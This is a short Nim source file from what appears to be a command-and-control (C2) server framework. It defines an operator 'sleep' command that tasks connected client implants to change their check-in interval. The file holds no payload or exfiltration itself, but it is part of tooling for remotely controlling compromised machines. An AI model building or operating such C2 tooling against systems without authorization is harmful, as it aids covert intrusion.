import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 1:
    errorLog "missing argument, see 'help sleep'"
    return
  
  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("sleep", %*[ args[0] ])
    if not task.isNil(): 
      await task.awaitResponse()
      if task.isError():
        errorLog task.output.error
      else:
        successLog "successfully set sleep time to " & args[0] & " seconds"

let cmd*: Command = Command(
  execProc: execProc,
  name: "sleep",
  argsLength: 1,
  usage: @["sleep [seconds]"],
  cliMode: @[ClientInteractMode],
  description: "Set the sleep time in seconds",
  category: CCClientInteraction,
  requiresConnectedClient: true
)